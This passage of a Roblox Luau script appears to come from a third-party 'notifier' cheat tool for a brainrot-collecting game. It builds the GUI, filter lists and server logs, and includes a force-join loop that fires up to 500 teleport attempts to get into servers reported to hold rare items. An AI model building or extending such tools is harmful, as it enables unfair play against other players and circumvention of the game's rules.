			btn.BackgroundColor3 = THEME.Red; btn.Text = "⏸"
		end
		return
	end
	local state = { running = true }
	joinStates[btn] = state
	local mt        = Config.ForceJoinCount or 50
	local origColor = btn.BackgroundColor3
	task.spawn(function()
		local i = 0
		while i < mt do
			if not state.running then
				task.wait(0.2)
			else
				i = i + 1
				btn.Text = i.."/"..mt; btn.BackgroundColor3 = THEME.Red
				pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, sid, lp) end)
				task.wait(0.1)
			end
		end
		joinStates[btn] = nil
		btn.BackgroundColor3 = origColor; btn.Text = "JOIN"
	end)
end

-- [[ NOTIFICATIONS ]] --
local activePopups = {}
local function ShowPopUp(title, msg, color, sid)
	local pw = isMobile and math.min(screenSize.X - 40, 300) or 280
	local p  = Instance.new("Frame", sg)
	p.Size   = UDim2.new(0, pw, 0, 90)
	p.Position = UDim2.new(0.5, -pw/2, 0, -100)
	p.BackgroundColor3 = THEME.Card; p.BorderSizePixel = 0
	Instance.new("UICorner", p).CornerRadius = UDim.new(0, 8)
	Instance.new("UIStroke", p).Color = color or THEME.Accent
	local tl = Instance.new("TextLabel", p)
	tl.Size = UDim2.new(1, 0, 0.3, 0); tl.Text = title
	tl.TextColor3 = color or THEME.Accent; tl.Font = Enum.Font.GothamBold
	tl.TextSize = 14; tl.BackgroundTransparency = 1
	local ml = Instance.new("TextLabel", p)
	ml.Size = UDim2.new(1, -10, 0.3, 0); ml.Position = UDim2.new(0, 5, 0.3, 0)
	ml.Text = msg; ml.TextColor3 = THEME.Text; ml.Font = Enum.Font.GothamBold
	ml.TextSize = 11; ml.BackgroundTransparency = 1; ml.TextTruncate = Enum.TextTruncate.AtEnd
	local jB = Instance.new("TextButton", p)
	jB.Size = UDim2.new(0.8, 0, 0.28, 0); jB.Position = UDim2.new(0.1, 0, 0.67, 0)
	jB.BackgroundColor3 = THEME.Accent; jB.Text = "JOIN NOW"
	jB.TextColor3 = THEME.Text; jB.Font = Enum.Font.GothamBold; jB.TextSize = 12
	Instance.new("UICorner", jB).CornerRadius = UDim.new(0, 6)
	if sid then jB.MouseButton1Click:Connect(function() SmartJoin(sid, jB) end) else jB.Visible = false end
	table.insert(activePopups, p)
	local function up()
		for i, pp in ipairs(activePopups) do
			if pp.Parent then pp:TweenPosition(UDim2.new(0.5, -pw/2, 0, 55+((i-1)*100)), "Out", "Back", 0.3, true) end
		end
	end
	up()
	task.delay(4, function()
		local idx = table.find(activePopups, p)
		if idx then table.remove(activePopups, idx) end
		p:TweenPosition(UDim2.new(0.5, -pw/2, 0, -100), "In", "Quad", 0.5, true)
		up()
		task.delay(0.6, function() p:Destroy() end)
	end)
end

main.Visible = false
main.Size    = UDim2.new(0, 0, 0, 0)

-- [[ SNOW ]] --
local snowFrame = Instance.new("Frame", main)
snowFrame.Size = UDim2.new(1, 0, 1, 0); snowFrame.BackgroundTransparency = 1; snowFrame.ZIndex = 1
task.spawn(function()
	while task.wait(0.3) do
		if main.Visible then
			local f = Instance.new("TextLabel", snowFrame)
			f.Text = "·"; f.TextColor3 = Color3.new(1, 1, 1); f.TextTransparency = 0.6
			f.BackgroundTransparency = 1
			f.Position = UDim2.new(math.random(), 0, -0.1, 0)
			f.TextSize = math.random(6, 10); f.ZIndex = 1
			f:TweenPosition(UDim2.new(f.Position.X.Scale + ((math.random()-0.5)*0.15), 0, 1.1, 0), "Out", "Linear", math.random(4, 7))
			task.delay(7, function() f:Destroy() end)
		end
	end
end)

-- ============================================================
-- [[ UI HEADER ]]
-- ============================================================
local header = Instance.new("Frame", main)
header.Size = UDim2.new(1, 0, 0, M.headerH); header.BackgroundTransparency = 1; header.ZIndex = 100

local pSize      = M.headerH - 20
local profileImg = Instance.new("ImageLabel", header)
profileImg.Size  = UDim2.new(0, pSize, 0, pSize); profileImg.Position = UDim2.new(0, 10, 0, 10)
profileImg.Image = "rbxthumb://type=AvatarHeadShot&id="..lp.UserId.."&w=150&h=150"
profileImg.BackgroundTransparency = 1
Instance.new("UICorner", profileImg).CornerRadius = UDim.new(1, 0)
Instance.new("UIStroke", profileImg).Color = THEME.Accent

local uName = Instance.new("TextLabel", header)
uName.Text  = lp.DisplayName; uName.Size = UDim2.new(0, 150, 0, 18)
uName.Position = UDim2.new(0, M.headerH, 0, isMobile and 8 or 15)
uName.TextColor3 = THEME.Text; uName.Font = Enum.Font.GothamBold
uName.TextSize = M.fontSizeBig; uName.BackgroundTransparency = 1
uName.TextXAlignment = Enum.TextXAlignment.Left

local od = Instance.new("Frame", header)
od.Size = UDim2.new(0, 7, 0, 7); od.Position = UDim2.new(0, M.headerH, 0, isMobile and 28 or 38)
od.BackgroundColor3 = THEME.Green; Instance.new("UICorner", od).CornerRadius = UDim.new(1, 0)
task.spawn(function()
	while true do
		TweenService:Create(od, TweenInfo.new(0.8), {BackgroundTransparency = 0.7}):Play(); task.wait(0.8)
		TweenService:Create(od, TweenInfo.new(0.8), {BackgroundTransparency = 0}):Play();   task.wait(0.8)
	end
end)

local ot = Instance.new("TextLabel", header)
ot.Text = "ONLINE"; ot.Size = UDim2.new(0, 60, 0, 16)
ot.Position = UDim2.new(0, M.headerH + 12, 0, isMobile and 24 or 31)
ot.TextColor3 = THEME.Green; ot.Font = Enum.Font.GothamBold
ot.TextSize = isMobile and 10 or 12; ot.BackgroundTransparency = 1
ot.TextXAlignment = Enum.TextXAlignment.Left

local tm = Instance.new("TextLabel", header)
tm.Text = "UCHIWA NOTIFIER"; tm.Size = UDim2.new(0, 200, 0, 25)
tm.Position = UDim2.new(1, isMobile and -40 or -45, 0, isMobile and 6 or 12)
tm.AnchorPoint = Vector2.new(1, 0); tm.TextColor3 = THEME.Accent
tm.Font = Enum.Font.GothamBold; tm.TextSize = isMobile and 14 or 20
tm.BackgroundTransparency = 1; tm.TextXAlignment = Enum.TextXAlignment.Right

local closeBtnSize = isMobile and 34 or 30
local closeBtn = Instance.new("TextButton", header)
closeBtn.Size = UDim2.new(0, closeBtnSize, 0, closeBtnSize)
closeBtn.Position = UDim2.new(1, -10, 0, 10); closeBtn.AnchorPoint = Vector2.new(1, 0)
closeBtn.BackgroundColor3 = THEME.Secondary; closeBtn.Text = "X"
closeBtn.TextColor3 = THEME.Red; closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 18; closeBtn.ZIndex = 110
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

-- ============================================================
-- [[ PAGES ]]
-- ============================================================
local container = Instance.new("Frame", main)
container.Size = UDim2.new(1, -12, 1, -(M.headerH + M.navH + 16))
container.Position = UDim2.new(0, 6, 0, M.headerH + 4)
container.BackgroundTransparency = 1; container.ZIndex = 5

local function mkPage(vis)
	local p = Instance.new("ScrollingFrame", container)
	p.Size = UDim2.new(1, 0, 1, 0); p.BackgroundTransparency = 1; p.Visible = vis
	p.ScrollBarThickness = M.scrollBar; p.AutomaticCanvasSize = Enum.AutomaticSize.Y
	p.ScrollBarImageColor3 = THEME.Accent
	return p
end
local filterPage  = mkPage(true)
local generalPage = mkPage(false)
local joinerPage  = mkPage(false)
-- ============================================================
-- [[ FILTERS PAGE ]]
-- ============================================================
local fLL = Instance.new("UIListLayout", filterPage)
fLL.Padding = UDim.new(0, M.touchPad); fLL.SortOrder = Enum.SortOrder.LayoutOrder

local fH = Instance.new("Frame", filterPage)
fH.Size = UDim2.new(1, 0, 0, isMobile and 135 or 125); fH.BackgroundTransparency = 1; fH.LayoutOrder = 1

local searchBox = Instance.new("TextBox", fH)
searchBox.Size = UDim2.new(1, 0, 0, M.btnH); searchBox.BackgroundColor3 = THEME.Secondary
searchBox.PlaceholderText = "Search brainrots..."; searchBox.PlaceholderColor3 = THEME.DimText
searchBox.Text = ""; searchBox.TextColor3 = THEME.Text
searchBox.Font = Enum.Font.GothamBold; searchBox.TextSize = M.fontSize
Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 8)

local mvT = Instance.new("TextLabel", fH)
mvT.Text = "MIN VALUE :"; mvT.Size = UDim2.new(0.4, 0, 0, 28)
mvT.Position = UDim2.new(0, 0, 0, M.btnH + 6); mvT.TextColor3 = THEME.Accent
mvT.Font = Enum.Font.GothamBold; mvT.TextSize = M.fontSize
mvT.BackgroundTransparency = 1; mvT.TextXAlignment = Enum.TextXAlignment.Left

local mvI = Instance.new("TextBox", fH)
mvI.Size = UDim2.new(0.5, 0, 0, 28); mvI.Position = UDim2.new(0.45, 0, 0, M.btnH + 6)
mvI.BackgroundColor3 = THEME.Secondary; mvI.Text = tostring(Config.MinValue or "0")
mvI.TextColor3 = THEME.Text; mvI.Font = Enum.Font.GothamBold; mvI.TextSize = M.fontSize
Instance.new("UICorner", mvI).CornerRadius = UDim.new(0, 6)
mvI.FocusLost:Connect(function() Config.MinValue = mvI.Text; SaveConfig(Config) end)

local btnY = M.btnH + 40
local sA = Instance.new("TextButton", fH)
sA.Size = UDim2.new(0.48, 0, 0, M.btnH); sA.Position = UDim2.new(0, 0, 0, btnY)
sA.BackgroundColor3 = THEME.Accent; sA.Text = "SELECT ALL"
sA.TextColor3 = THEME.Text; sA.Font = Enum.Font.GothamBold
sA.TextSize = isMobile and 11 or 12; Instance.new("UICorner", sA).CornerRadius = UDim.new(0, 6)

local sN = Instance.new("TextButton", fH)
sN.Size = UDim2.new(0.48, 0, 0, M.btnH); sN.Position = UDim2.new(0.52, 0, 0, btnY)
sN.BackgroundColor3 = THEME.Red; sN.Text = "DESELECT ALL"
sN.TextColor3 = THEME.Text; sN.Font = Enum.Font.GothamBold
sN.TextSize = isMobile and 11 or 12; Instance.new("UICorner", sN).CornerRadius = UDim.new(0, 6)

local petFrames, checkButtons = {}, {}
local function addSection(txt, ord, parent)
	local s = Instance.new("TextLabel", parent or filterPage)
	s.Size = UDim2.new(1, 0, 0, 30); s.Text = txt; s.TextColor3 = THEME.Accent
	s.Font = Enum.Font.GothamBold; s.TextSize = 16; s.BackgroundTransparency = 1
	s.LayoutOrder = ord; return s
end
local function addPet(name, ord)
	local f = Instance.new("Frame", filterPage)
	f.Size = UDim2.new(1, -4, 0, M.petRowH); f.BackgroundColor3 = THEME.Secondary
	f.BackgroundTransparency = 0.3; f.LayoutOrder = ord
	Instance.new("UICorner", f).CornerRadius = UDim.new(0, 6); f.Name = name
	local l = Instance.new("TextLabel", f)
	l.Size = UDim2.new(0.5, 0, 1, 0); l.Position = UDim2.new(0, 10, 0, 0)
	l.Text = name; l.TextColor3 = THEME.Text; l.Font = Enum.Font.GothamBold
	l.TextSize = M.fontSize; l.BackgroundTransparency = 1
	l.TextXAlignment = Enum.TextXAlignment.Left; l.TextTruncate = Enum.TextTruncate.AtEnd
	local vi = Instance.new("TextBox", f)
	vi.Size = UDim2.new(0, isMobile and 50 or 45, 0, M.checkSize)
	vi.Position = UDim2.new(1, -(M.checkSize + 60), 0.5, -M.checkSize/2)
	vi.BackgroundColor3 = THEME.BG; vi.Text = tostring(Config.CustomMin[name] or "0")
	vi.TextColor3 = THEME.Accent; vi.Font = Enum.Font.GothamBold; vi.TextSize = M.fontSizeSmall
	Instance.new("UICorner", vi).CornerRadius = UDim.new(0, 4)
	vi.FocusLost:Connect(function() Config.CustomMin[name] = vi.Text; SaveConfig(Config) end)
	local c = Instance.new("TextButton", f)
	c.Size = UDim2.new(0, M.checkSize, 0, M.checkSize)
	c.Position = UDim2.new(1, -(M.checkSize + 6), 0.5, -M.checkSize/2)
	c.BackgroundColor3 = table.find(Config.PriorityList, name) and THEME.Accent or THEME.BG
	c.Text = ""; Instance.new("UICorner", c).CornerRadius = UDim.new(0, 4)
	Instance.new("UIStroke", c).Color = THEME.Accent
	c.MouseButton1Click:Connect(function()
		local idx = table.find(Config.PriorityList, name)
		if idx then table.remove(Config.PriorityList, idx); c.BackgroundColor3 = THEME.BG
		else table.insert(Config.PriorityList, name); c.BackgroundColor3 = THEME.Accent end
		SaveConfig(Config)
	end)
	checkButtons[name] = c; petFrames[name] = f
end
addSection("OG", 10)
for i, p in ipairs(OGS)     do addPet(p, 11+i)  end
addSection("SECRET", 100)
for i, p in ipairs(SECRETS) do addPet(p, 101+i) end

sA.MouseButton1Click:Connect(function()
	for n, b in pairs(checkButtons) do
		if not table.find(Config.PriorityList, n) then table.insert(Config.PriorityList, n) end
		b.BackgroundColor3 = THEME.Accent
	end
	SaveConfig(Config)
end)
sN.MouseButton1Click:Connect(function()
	Config.PriorityList = {}
	for _, b in pairs(checkButtons) do b.BackgroundColor3 = THEME.BG end
	SaveConfig(Config)
end)
searchBox:GetPropertyChangedSignal("Text"):Connect(function()
	local q = searchBox.Text:lower()
	for n, f in pairs(petFrames) do f.Visible = n:lower():find(q) ~= nil end
end)

-- ============================================================
-- [[ GENERAL PAGE ]]
-- ============================================================
local gLL = Instance.new("UIListLayout", generalPage)
gLL.Padding = UDim.new(0, M.touchPad); gLL.SortOrder = Enum.SortOrder.LayoutOrder

addSection("SOUND ID:", 1, generalPage)
local sInput = Instance.new("TextBox", generalPage)
sInput.Size = UDim2.new(1, 0, 0, M.btnH); sInput.BackgroundColor3 = THEME.Secondary
sInput.Text = tostring(Config.SoundID or ""); sInput.TextColor3 = THEME.Text
sInput.Font = Enum.Font.GothamBold; sInput.TextSize = M.fontSize
Instance.new("UICorner", sInput).CornerRadius = UDim.new(0, 6); sInput.LayoutOrder = 2
sInput.FocusLost:Connect(function() Config.SoundID = sInput.Text; SaveConfig(Config) end)

local testSnd = Instance.new("TextButton", generalPage)
testSnd.Size = UDim2.new(1, 0, 0, M.btnH); testSnd.BackgroundColor3 = THEME.Secondary
testSnd.Text = "TEST SOUND"; testSnd.TextColor3 = THEME.Accent
testSnd.Font = Enum.Font.GothamBold; testSnd.TextSize = M.fontSize
Instance.new("UICorner", testSnd).CornerRadius = UDim.new(0, 6); testSnd.LayoutOrder = 3
testSnd.MouseButton1Click:Connect(function()
	local s = Instance.new("Sound", SoundService)
	s.SoundId = "rbxassetid://"..tostring(Config.SoundID); s.Volume = Config.Volume
	s:Play(); task.delay(5, function() s:Destroy() end)
end)

local volTitle = Instance.new("TextLabel", generalPage)
volTitle.Size = UDim2.new(1, 0, 0, 24)
volTitle.Text = "VOLUME: "..(math.floor((Config.Volume or 1)*100)).."%"
volTitle.TextColor3 = THEME.Accent; volTitle.Font = Enum.Font.GothamBold
volTitle.TextSize = M.fontSize; volTitle.BackgroundTransparency = 1; volTitle.LayoutOrder = 4

local volSlider = Instance.new("Frame", generalPage)
volSlider.Size = UDim2.new(1, 0, 0, isMobile and 24 or 18)
volSlider.BackgroundColor3 = THEME.Secondary
Instance.new("UICorner", volSlider).CornerRadius = UDim.new(0, 6); volSlider.LayoutOrder = 5

local volFill = Instance.new("Frame", volSlider)
volFill.Size = UDim2.new(Config.Volume or 1, 0, 1, 0); volFill.BackgroundColor3 = THEME.Accent
Instance.new("UICorner", volFill).CornerRadius = UDim.new(0, 6)

local volBtn = Instance.new("TextButton", volSlider)
volBtn.Size = UDim2.new(1, 0, 1, 0); volBtn.BackgroundTransparency = 1; volBtn.Text = ""
volBtn.MouseButton1Down:Connect(function()
	local conn
	conn = UserInputService.InputChanged:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
			local pos = math.clamp((inp.Position.X - volSlider.AbsolutePosition.X) / volSlider.AbsoluteSize.X, 0, 1)
			volFill.Size = UDim2.new(pos, 0, 1, 0); Config.Volume = pos
			volTitle.Text = "VOLUME: "..(math.floor(pos*100)).."%"
		end
	end)
	UserInputService.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			conn:Disconnect(); SaveConfig(Config)
		end
	end)
end)

local rdBtn = Instance.new("TextButton", generalPage)
rdBtn.Size = UDim2.new(1, 0, 0, M.btnH)
rdBtn.BackgroundColor3 = Config.RemoveDuel and THEME.Green or THEME.Secondary
rdBtn.Text = "REMOVE DUEL LOGS"; rdBtn.TextColor3 = THEME.Text
rdBtn.Font = Enum.Font.GothamBold; rdBtn.TextSize = M.fontSize
Instance.new("UICorner", rdBtn).CornerRadius = UDim.new(0, 6); rdBtn.LayoutOrder = 6
rdBtn.MouseButton1Click:Connect(function()
	Config.RemoveDuel = not Config.RemoveDuel
	rdBtn.BackgroundColor3 = Config.RemoveDuel and THEME.Green or THEME.Secondary
	SaveConfig(Config)
end)

addSection("FORCE JOIN :", 7, generalPage)
local fjF = Instance.new("Frame", generalPage)
fjF.Size = UDim2.new(1, 0, 0, M.btnH + 4); fjF.BackgroundColor3 = THEME.Secondary
fjF.BackgroundTransparency = 0.3; fjF.LayoutOrder = 8
Instance.new("UICorner", fjF).CornerRadius = UDim.new(0, 6)

local fjL = Instance.new("TextLabel", fjF)
fjL.Size = UDim2.new(0.5, 0, 1, 0); fjL.Position = UDim2.new(0, 12, 0, 0)
fjL.Text = "Tentatives :"; fjL.TextColor3 = THEME.SubText
fjL.Font = Enum.Font.Gotham; fjL.TextSize = M.fontSizeSmall
fjL.BackgroundTransparency = 1; fjL.TextXAlignment = Enum.TextXAlignment.Left

local fjBtnS = isMobile and 32 or 28
local fjM = Instance.new("TextButton", fjF)
fjM.Size = UDim2.new(0, fjBtnS, 0, fjBtnS); fjM.Position = UDim2.new(1, -(fjBtnS*3+12), 0.5, -fjBtnS/2)
fjM.BackgroundColor3 = THEME.BG; fjM.Text = "-"; fjM.TextColor3 = THEME.Red
fjM.Font = Enum.Font.GothamBold; fjM.TextSize = 16
Instance.new("UICorner", fjM).CornerRadius = UDim.new(0, 4)

local fjV = Instance.new("TextBox", fjF)
fjV.Size = UDim2.new(0, fjBtnS+16, 0, fjBtnS); fjV.Position = UDim2.new(1, -(fjBtnS*2+8), 0.5, -fjBtnS/2)
fjV.BackgroundColor3 = THEME.BG; fjV.Text = tostring(Config.ForceJoinCount or 50)
fjV.TextColor3 = THEME.Accent; fjV.Font = Enum.Font.GothamBold; fjV.TextSize = M.fontSize
fjV.TextXAlignment = Enum.TextXAlignment.Center
Instance.new("UICorner", fjV).CornerRadius = UDim.new(0, 4)

local fjP = Instance.new("TextButton", fjF)
fjP.Size = UDim2.new(0, fjBtnS, 0, fjBtnS); fjP.Position = UDim2.new(1, -fjBtnS-4, 0.5, -fjBtnS/2)
fjP.BackgroundColor3 = THEME.BG; fjP.Text = "+"; fjP.TextColor3 = THEME.Green
fjP.Font = Enum.Font.GothamBold; fjP.TextSize = 16
Instance.new("UICorner", fjP).CornerRadius = UDim.new(0, 4)

local function uFJ() fjV.Text = tostring(Config.ForceJoinCount) end
fjM.MouseButton1Click:Connect(function() Config.ForceJoinCount = math.max(1, (Config.ForceJoinCount or 50) - 10); uFJ(); SaveConfig(Config) end)
fjP.MouseButton1Click:Connect(function() Config.ForceJoinCount = math.min(500, (Config.ForceJoinCount or 50) + 10); uFJ(); SaveConfig(Config) end)
fjV.FocusLost:Connect(function()
	local n = tonumber(fjV.Text)
	if n then Config.ForceJoinCount = math.clamp(math.floor(n), 1, 500) end
	uFJ(); SaveConfig(Config)
end)

addSection("OUVRIR / FERMER UI :", 9, generalPage)
local tkFrame = Instance.new("Frame", generalPage)
tkFrame.Size = UDim2.new(1, 0, 0, M.btnH + 4); tkFrame.BackgroundColor3 = THEME.Secondary
tkFrame.BackgroundTransparency = 0.3; tkFrame.LayoutOrder = 10
Instance.new("UICorner", tkFrame).CornerRadius = UDim.new(0, 6)

local tkLabel = Instance.new("TextLabel", tkFrame)
tkLabel.Size = UDim2.new(0.45, 0, 1, 0); tkLabel.Position = UDim2.new(0, 12, 0, 0)
tkLabel.Text = "Touche :"; tkLabel.TextColor3 = THEME.SubText
tkLabel.Font = Enum.Font.Gotham; tkLabel.TextSize = M.fontSizeSmall
tkLabel.BackgroundTransparency = 1; tkLabel.TextXAlignment = Enum.TextXAlignment.Left

local tkBtn = Instance.new("TextButton", tkFrame)
tkBtn.Size = UDim2.new(0.5, -8, 0, fjBtnS); tkBtn.Position = UDim2.new(0.5, 4, 0.5, -fjBtnS/2)
tkBtn.BackgroundColor3 = THEME.BG; tkBtn.Text = tostring(Config.ToggleKey or "LeftControl")
tkBtn.TextColor3 = THEME.Accent; tkBtn.Font = Enum.Font.GothamBold; tkBtn.TextSize = M.fontSize
Instance.new("UICorner", tkBtn).CornerRadius = UDim.new(0, 4)
Instance.new("UIStroke", tkBtn).Color = THEME.Accent

local waitingForKey = false
tkBtn.MouseButton1Click:Connect(function()
	if waitingForKey then return end
	waitingForKey = true; tkBtn.Text = "..."; tkBtn.TextColor3 = THEME.Gold
	local conn
	conn = UserInputService.InputBegan:Connect(function(input, gpe)
		if gpe then return end
		if input.UserInputType == Enum.UserInputType.Keyboard then
			local keyName = input.KeyCode.Name
			Config.ToggleKey = keyName; tkBtn.Text = keyName; tkBtn.TextColor3 = THEME.Accent
			SaveConfig(Config); waitingForKey = false; conn:Disconnect()
		end
	end)
	task.delay(5, function()
		if waitingForKey then
			waitingForKey = false; tkBtn.Text = Config.ToggleKey or "LeftControl"; tkBtn.TextColor3 = THEME.Accent
			if conn then conn:Disconnect() end
		end
	end)
end)

UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if waitingForKey then return end
	if input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode.Name == (Config.ToggleKey or "LeftControl") then toggleUI() end
	end
end)

-- ============================================================
-- [[ LOGS PAGE ]]
-- ============================================================
local jLL = Instance.new("UIListLayout", joinerPage)
jLL.Padding = UDim.new(0, M.touchPad); jLL.SortOrder = Enum.SortOrder.LayoutOrder

local colH = Instance.new("Frame", joinerPage)
colH.Size = UDim2.new(1, -4, 0, 20); colH.BackgroundTransparency = 1; colH.LayoutOrder = 0

local function mkColLabel(parent, sz, pos, txt)
	local l = Instance.new("TextLabel", parent)
	l.Size = sz; l.Position = pos; l.Text = txt; l.TextColor3 = THEME.DimText
	l.Font = Enum.Font.GothamBold; l.TextSize = 8; l.BackgroundTransparency = 1
	l.TextXAlignment = Enum.TextXAlignment.Left
end
mkColLabel(colH, UDim2.new(0, 35, 1, 0),  UDim2.new(0, 4,    0, 0), "TIME")
mkColLabel(colH, UDim2.new(0.4, 0, 1, 0), UDim2.new(0, 42,   0, 0), "BRAINROT")
mkColLabel(colH, UDim2.new(0, 60, 1, 0),  UDim2.new(1, -130, 0, 0), "VALUE")

local logOrder = 1

-- ============================================================
-- [[ ADD LOG ]]
-- ============================================================
function AddWSLog(pet, val, user, serverId, timestamp, inDuelFlag)
	if type(val) ~= "string" then val = "" end
	if type(pet) ~= "string" then pet = "unknown" end

	local localTime = os.time() * 1000
	local isDuel    = inDuelFlag or (val:lower():find("duel") ~= nil)
	local isWS      = val:lower():find("%[ws%]")
	if Config.RemoveDuel and isDuel then return end

	local cv = val
		:gsub("%s*%[DUEL%]",""):gsub("%s*%[duel%]","")
		:gsub("%s*%[WS%]",  ""):gsub("%s*%[ws%]",  "")

	local MUTATIONS = {
		{ name = "Divine",      color = Color3.fromRGB(255, 209, 59),  bg = Color3.fromRGB(32,  28, 14) },
		{ name = "Cursed",      color = Color3.fromRGB(245, 56,  56),  bg = Color3.fromRGB(28,  12, 12) },
		{ name = "Radioactive", color = Color3.fromRGB(104, 245, 0),   bg = Color3.fromRGB(14,  28, 10) },
		{ name = "Yin Yang",    color = Color3.fromRGB(255, 255, 255), bg = Color3.fromRGB(28,  28, 28) },
		{ name = "Galaxy",      color = Color3.fromRGB(170, 60,  255), bg = Color3.fromRGB(22,  14, 32) },
		{ name = "Lava",        color = Color3.fromRGB(255, 149, 0),   bg = Color3.fromRGB(32,  20, 10) },
		{ name = "Candy",       color = Color3.fromRGB(255, 70,  246), bg = Color3.fromRGB(30,  14, 28) },
		{ name = "Rainbow",     color = Color3.fromRGB(255, 0,   251), bg = Color3.fromRGB(28,  12, 28) },
		{ name = "Bloodrot",    color = Color3.fromRGB(145, 0,   27),  bg = Color3.fromRGB(24,  10, 12) },
		{ name = "Diamond",     color = Color3.fromRGB(37,  196, 254), bg = Color3.fromRGB(12,  22, 30) },
		{ name = "Gold",        color = Color3.fromRGB(255, 222, 89),  bg = Color3.fromRGB(28,  24, 14) },
		{ name = "Normal",      color = Color3.fromRGB(0,   255, 100), bg = THEME.Card },
	}

	local mutation = "Normal"
	local mutColor = Color3.fromRGB(0, 255, 100)
	local mutBG    = THEME.Card
	local valLower = val:lower()
	for _, m in ipairs(MUTATIONS) do
		if valLower:find(m.name:lower()) then
			mutation = m.name; mutColor = m.color; mutBG = m.bg; break
		end
	end

	local pctMatch = val:match("(%d+%.?%d*)%%")
	local tT, tC
	if isDuel then     tT = "Duel";     tC = THEME.Red
	elseif isWS then   tT = "WS";       tC = THEME.Orange
	else               tT = mutation;   tC = mutColor end

	local cleanDisplay = cv
	for _, m in ipairs(MUTATIONS) do
		cleanDisplay = cleanDisplay:gsub("%s*%[?" .. m.name       .. "%]?%s*", "")
		cleanDisplay = cleanDisplay:gsub("%s*%[?" .. m.name:lower() .. "%]?%s*", "")
	end
	cleanDisplay = cleanDisplay:gsub("%[%]",""):gsub("%[%s*%]",""):gsub("^%s+",""):gsub("%s+$","")

	local isP         = table.find(Config.PriorityList, pet) ~= nil
	local hasPrioInSrv= false
	if serverId and serverId ~= "" then
		local hp, _ = hasPriorityInServer(serverId); hasPrioInSrv = hp
	end
	local hasSD = serverId and serverId ~= "" and serverBrainrots[serverId] and #serverBrainrots[serverId] > 1
	local hasSI = serverId and serverId ~= ""

	logOrder = logOrder + 1
	local ro = logOrder
	local RH = M.logRowH

	local wr = Instance.new("Frame", joinerPage)
	wr.Size = UDim2.new(1, -4, 0, RH); wr.BackgroundTransparency = 1
	wr.LayoutOrder = ro; wr.ClipsDescendants = true

	local rowBG = isP and THEME.PriorityBG or mutBG
	local it = Instance.new("Frame", wr)
	it.Size = UDim2.new(1, 0, 0, RH); it.BackgroundColor3 = rowBG
	it.BorderSizePixel = 0; it.BackgroundTransparency = 0.3
	Instance.new("UICorner", it).CornerRadius = UDim.new(0, 6)

	local sb = Instance.new("Frame", it)
	sb.Size = UDim2.new(0, 3, 0.7, 0); sb.Position = UDim2.new(0, 0, 0.15, 0)
	sb.BackgroundColor3 = tC; sb.BorderSizePixel = 0
	Instance.new("UICorner", sb).CornerRadius = UDim.new(0, 2)

	local el = Instance.new("TextLabel", it)
	el.Size = UDim2.new(0, 35, 1, 0); el.Position = UDim2.new(0, 6, 0, 0)
	el.Text = "0s"; el.TextColor3 = THEME.SubText; el.Font = Enum.Font.GothamBold
	el.TextSize = M.fontSizeSmall; el.BackgroundTransparency = 1
	el.TextXAlignment = Enum.TextXAlignment.Left

	local nf = Instance.new("Frame", it)
	nf.Size = UDim2.new(0.4, 0, 1, 0); nf.Position = UDim2.new(0, 42, 0, 0)
	nf.BackgroundTransparency = 1

	local nl = Instance.new("TextLabel", nf)
	nl.Size = UDim2.new(1, 0, 0.55, 0); nl.Position = UDim2.new(0, 0, 0.02, 0)
	nl.Text = pet; nl.TextColor3 = THEME.Text; nl.Font = Enum.Font.GothamBold
	nl.TextSize = M.fontSizeSmall; nl.BackgroundTransparency = 1
	nl.TextXAlignment = Enum.TextXAlignment.Left; nl.TextTruncate = Enum.TextTruncate.AtEnd

	local badgeW = math.max(#tT * 6 + 8, 45)
	local tbg = Instance.new("TextLabel", nf)
	tbg.Size = UDim2.new(0, badgeW, 0, 14); tbg.Position = UDim2.new(0, 0, 0.56, 0)
	tbg.Text = tT; tbg.TextColor3 = tC; tbg.Font = Enum.Font.GothamBold; tbg.TextSize = 8
	tbg.BackgroundColor3 = Color3.fromRGB(tC.R*255*0.15, tC.G*255*0.15, tC.B*255*0.15)
	tbg.TextXAlignment = Enum.TextXAlignment.Center
	Instance.new("UICorner", tbg).CornerRadius = UDim.new(0, 3)

	if isP then
		local st = Instance.new("TextLabel", nf)
		st.Size = UDim2.new(0, 12, 0, 12); st.Position = UDim2.new(0, badgeW + 4, 0.56, 1)
		st.Text = "⭐"; st.TextSize = 9; st.BackgroundTransparency = 1
	end

	if pctMatch then
		local pX       = isP and (badgeW + 20) or (badgeW + 4)
		local pctBadge = Instance.new("TextLabel", nf)
		pctBadge.Size = UDim2.new(0, 30, 0, 14); pctBadge.Position = UDim2.new(0, pX, 0.56, 0)
		pctBadge.Text = pctMatch.."%"; pctBadge.TextColor3 = THEME.Gold
		pctBadge.Font = Enum.Font.GothamBold; pctBadge.TextSize = 8
		pctBadge.BackgroundColor3 = Color3.fromRGB(40, 32, 10)
		pctBadge.TextXAlignment = Enum.TextXAlignment.Center
		Instance.new("UICorner", pctBadge).CornerRadius = UDim.new(0, 3)
	end

	local arrow
	if hasSD then
		arrow = Instance.new("TextLabel", it); arrow.Name = "Arrow"
		arrow.Size = UDim2.new(0, 12, 0, 12); arrow.Position =  UDim2.new(0, 40, 0, 1)
		arrow.Text = "▼"; arrow.TextColor3 = THEME.DimText
		arrow.Font = Enum.Font.GothamBold; arrow.TextSize = 7; arrow.BackgroundTransparency = 1
	end

	local gl = Instance.new("TextLabel", it)
	gl.Size = UDim2.new(0, 65, 1, 0); gl.Position = UDim2.new(1, -(M.joinBtnW + 72), 0, 0)
	gl.Text = cleanDisplay; gl.TextColor3 = tC; gl.Font = Enum.Font.GothamBold
	gl.TextSize = M.fontSizeSmall; gl.BackgroundTransparency = 1
	gl.TextXAlignment = Enum.TextXAlignment.Center

	local j = Instance.new("TextButton", it)
	j.Size = UDim2.new(0, M.joinBtnW, 0, M.joinBtnH)
	j.Position = UDim2.new(1, -(M.joinBtnW+4), 0.5, -M.joinBtnH/2)
	j.Font = Enum.Font.GothamBold; j.TextSize = M.fontSizeSmall; j.ZIndex = 10
